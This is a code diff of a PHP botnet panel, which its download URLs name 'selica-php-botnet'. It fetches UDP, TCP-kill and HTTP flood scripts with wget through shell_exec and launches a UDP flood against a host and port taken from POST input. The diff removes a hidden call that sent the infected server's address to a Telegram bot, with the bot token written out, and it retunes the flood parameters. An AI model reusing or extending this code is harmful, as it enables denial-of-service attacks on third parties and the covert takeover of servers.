@@ -11,7 +11,6 @@ if (!empty($_GET["install"])){
 	shell_exec("wget -nc https://raw.githubusercontent.com/ServerSideProject/selica-php-botnet/main/methods/HTTP-RAND.js");
 	shell_exec("wget -nc https://raw.githubusercontent.com/ServerSideProject/selica-php-botnet/main/methods/tcp_kill.js");
 	shell_exec("wget -nc https://raw.githubusercontent.com/ServerSideProject/selica-php-botnet/main/methods/udp.py");
-	file_get_contents("https://api.telegram.org/bot5397589274:AAFWAqxt_U5PbhN6KFHMRqat38lz3dhA6gM/sendMessage?chat_id=1159678884&text=http://".$bot);	
     echo("all methods has been downloaded");
 }
 
@@ -43,7 +42,7 @@ if (!empty($_POST["method"])){
 		$port = $_POST["port"];
 		$time = $_POST["time"];
 		echo("udp flood sent to $host:$port $time");
-		shell_exec("python3 udp.py $host $port $time 50000 50");
+		shell_exec("python3 udp.py $host $port $time 200 10");
 	}
 
 	if($method == "4"){     //node tcp_kill connect 
